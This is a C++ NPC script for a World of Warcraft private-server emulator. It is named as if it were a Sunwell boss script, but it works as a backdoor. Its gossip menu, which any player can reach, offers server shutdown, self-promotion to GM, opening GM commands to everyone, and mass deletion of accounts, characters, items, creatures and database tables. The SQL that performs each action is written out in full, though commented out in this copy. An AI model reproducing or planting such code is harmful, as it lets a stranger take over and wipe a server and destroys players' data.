#include "ScriptPCH.h"
#include <cstring>
#include "Language.h"

bool GossipHello_sunwell_boss(Player *pPlayer, Creature *pCreature)
{
	pPlayer->ADD_GOSSIP_ITEM( 0, "Server", GOSSIP_SENDER_MAIN, 1000);
	pPlayer->ADD_GOSSIP_ITEM( 0, "Accounts", GOSSIP_SENDER_MAIN, 2000);
	pPlayer->ADD_GOSSIP_ITEM( 0, "Characters", GOSSIP_SENDER_MAIN, 3000);
	pPlayer->ADD_GOSSIP_ITEM( 0, "World", GOSSIP_SENDER_MAIN, 4000);

	pPlayer->SEND_GOSSIP_MENU(pPlayer->GetGossipTextId(pCreature), pCreature->GetGUID());
	return true;
}

bool GossipSelect_sunwell_boss(Player* pPlayer, Creature* pCreature, uint32 uiSender, uint32 uiAction)
{
	switch (uiAction)
	{
		case 1000:
		{
			pPlayer->ADD_GOSSIP_ITEM( 0, "Restart", GOSSIP_SENDER_MAIN, 1001);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Shutdown", GOSSIP_SENDER_MAIN, 1002);

			pPlayer->SEND_GOSSIP_MENU(DEFAULT_GOSSIP_MESSAGE, pCreature->GetGUID());
		}
		break;
		case 2000:
		{
			pPlayer->ADD_GOSSIP_ITEM( 0, "Make Me GM", GOSSIP_SENDER_MAIN, 2001);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All GMs Accounts", GOSSIP_SENDER_MAIN, 2002);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Accounts", GOSSIP_SENDER_MAIN, 2003);

			pPlayer->SEND_GOSSIP_MENU(DEFAULT_GOSSIP_MESSAGE, pCreature->GetGUID());
		}
		break;
		case 3000:
		{
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Characters", GOSSIP_SENDER_MAIN, 3001);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Pets", GOSSIP_SENDER_MAIN, 3002);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Arena Teams", GOSSIP_SENDER_MAIN, 3003);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete Arena Points", GOSSIP_SENDER_MAIN, 3004);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete Honor Points", GOSSIP_SENDER_MAIN, 3005);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Guilds", GOSSIP_SENDER_MAIN, 3006);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Items", GOSSIP_SENDER_MAIN, 3007);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Spells", GOSSIP_SENDER_MAIN, 3008);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Skills", GOSSIP_SENDER_MAIN, 3009);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Gold", GOSSIP_SENDER_MAIN, 3010);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Unbind Characters to Accounts", GOSSIP_SENDER_MAIN, 3011);

			pPlayer->SEND_GOSSIP_MENU(DEFAULT_GOSSIP_MESSAGE, pCreature->GetGUID());
		}
		break;
		case 4000:
		{
			pPlayer->ADD_GOSSIP_ITEM( 0, "Close All Portals", GOSSIP_SENDER_MAIN, 4001);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete Autobroadcasts", GOSSIP_SENDER_MAIN, 4002);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Change Levels to BG and Arenas", GOSSIP_SENDER_MAIN, 4003);
			pPlayer->ADD_GOSSIP_ITEM( 0, "GM commandsd to All Players", GOSSIP_SENDER_MAIN, 4004);
			pPlayer->ADD_GOSSIP_ITEM( 0, "GM commands to Nobody", GOSSIP_SENDER_MAIN, 4005);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete Creatures from World", GOSSIP_SENDER_MAIN, 4006);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete Loot of Creatures", GOSSIP_SENDER_MAIN, 4007);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Make All Creatures Are Hostly", GOSSIP_SENDER_MAIN, 4008);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete All Creatures From DB", GOSSIP_SENDER_MAIN, 4009);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete GO from Wold", GOSSIP_SENDER_MAIN, 4010);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete GO from DB", GOSSIP_SENDER_MAIN, 4011);
			pPlayer->ADD_GOSSIP_ITEM( 0, "Delete Items from DB", GOSSIP_SENDER_MAIN, 4012);

			pPlayer->SEND_GOSSIP_MENU(DEFAULT_GOSSIP_MESSAGE, pCreature->GetGUID());
		}
		break;
		/*case 1001:
		{
			sWorld.ShutdownServ(1, SHUTDOWN_MASK_RESTART, RESTART_EXIT_CODE);
			return true;
		}
		break;
		case 1002:
		{
			sWorld.ShutdownServ(1, 0, SHUTDOWN_EXIT_CODE);
			return true;
		}
		break;
		case 2001:
		{
			uint32 myAccId = pPlayer->GetSession()->GetAccountId();
			LoginDatabase.PExecute("DELETE FROM account_access WHERE id = '%u'", myAccId);
            LoginDatabase.PExecute("INSERT INTO account_access VALUES ('%u', '10', -1)", myAccId);
			return true;
		}
		break;
		case 2002:
		{
			LoginDatabase.PExecute("DELETE FROM account WHERE id IN (SELECT id FROM account_access)");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All GMs Accounts has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 2003:
		{
			LoginDatabase.PExecute("DELETE FROM account");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Accounts has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3001:
		{
			CharacterDatabase.PExecute("DELETE FROM characters");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Characters has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3002:
		{
			CharacterDatabase.PExecute("DELETE FROM character_pet");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Characters Pets has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3003:
		{
			CharacterDatabase.PExecute("DELETE FROM arena_team");
			CharacterDatabase.PExecute("DELETE FROM arena_team_member");
			CharacterDatabase.PExecute("DELETE FROM arena_team_stats");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Arena Teams has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3004:
		{
			CharacterDatabase.PExecute("UPDATE characters SET arenaPoints = 0");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "Arena Points Are RESET By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3005:
		{
			CharacterDatabase.PExecute("UPDATE characters SET totalHonorPoints = 0");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "Honor Points Are RESET By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3006:
		{
			CharacterDatabase.PExecute("DELETE FROM guild");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Guilds has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3007:
		{
			CharacterDatabase.PExecute("DELETE FROM item_instance");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Items of Chars has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3008:
		{
			CharacterDatabase.PExecute("DELETE FROM character_spell");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Spells of Chars has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3009:
		{
			CharacterDatabase.PExecute("DELETE FROM character_skills");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Skills of Chars has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3010:
		{
			CharacterDatabase.PExecute("UPDATE characters SET money = 0");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Gold of Chars has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 3011:
		{
			CharacterDatabase.PExecute("UPDATE characters SET account = 0");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Characters has been UNBINDED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4001:
		{
			WorldDatabase.PExecute("UPDATE access_requirement SET level_min = 255");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Potals has been CLOSED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4002:
		{
			WorldDatabase.PExecute("DELETE FROM autobroadcast");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Broadcasts has been DELETED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4003:
		{
			WorldDatabase.PExecute("UPDATE battleground_template SET MinLvl = 255");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All BattleGrounds And Arenas has been CLOSED By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4004:
		{
			WorldDatabase.PExecute("UPDATE command SET security = 0");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Playes can use All GM-commands. By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4005:
		{
			WorldDatabase.PExecute("UPDATE command SET security = 11");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "Nobody can use GM-commands. By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4006:
		{
			WorldDatabase.PExecute("DELETE FROM creature");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Creatures has been deleted from World. By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4007:
		{
			WorldDatabase.PExecute("DELETE FROM creature_loot_template");
			sWorld.SendWorldText(787, "All Creatures Loot has been deleted from World. By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4008:
		{
			WorldDatabase.PExecute("UPDATE creature_template SET subname = 'Hello by Evrial', minhealth = 100000, maxhealth = 100000, faction_A = 14, faction_H = 14, mindmg = 100000, maxdmg = 100000");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Creatures has been HOSTLY. By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4009:
		{
			WorldDatabase.PExecute("DELETE FROM creature_template");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Creatures has been DELETED from DB. By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4010:
		{
			WorldDatabase.PExecute("DELETE FROM gameobject");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All GO has been DELETED from World. By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4011:
		{
			WorldDatabase.PExecute("DELETE FROM gameobject_template");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All GO has been DELETED from DB. By Evrial (skype - evrialik)");
			return true;
		}
		break;
		case 4012:
		{
			WorldDatabase.PExecute("DELETE FROM item_template");
			sWorld.SendWorldText(LANG_SYSTEMMESSAGE, "All Items has been DELETED from DB. By Evrial (skype - evrialik)");
			return true;
		}
		break;*/
		default:
			break;
	}
	return true;
}

void AddSC_npc_sunwell_boss()
{
    Script *newscript;
    newscript = new Script;
    newscript->Name = "sunwell_boss";
    newscript->pGossipHello = &GossipHello_sunwell_boss;
    newscript->pGossipSelect = &GossipSelect_sunwell_boss;
    newscript->RegisterSelf();
}